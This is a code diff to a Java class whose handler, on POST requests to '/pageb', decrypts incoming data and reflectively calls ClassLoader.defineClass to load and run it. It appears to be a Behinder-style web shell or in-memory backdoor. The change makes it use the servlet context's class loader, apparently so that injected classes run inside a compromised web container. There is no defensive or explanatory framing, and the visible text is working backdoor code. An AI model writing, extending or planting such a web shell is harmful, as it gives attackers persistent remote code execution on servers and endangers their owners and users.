@@ -1,5 +1,7 @@
 package com.sf.sl;
 
+import com.sf.redefine.MyRequest;
+
 public class BX {
     private static final String pathPattern= "/pageb";
     private static byte[] Decrypt(byte[] data) {
@@ -55,8 +57,10 @@ public class BX {
     public static void doService(Object obj, String url,String method, java.io.InputStream in){
         if (url.matches(pathPattern)){
             if (method.equals("POST")){
-                ClassLoader loader = BX.class.getClassLoader();
                 try {
+                    java.util.Map objMap = (java.util.Map)obj;
+                    Object request = objMap.get("request");
+                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                     java.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod("defineClass", String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class);
                     defineMethod.setAccessible(true);
                     java.lang.reflect.Constructor<java.security.SecureClassLoader> constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
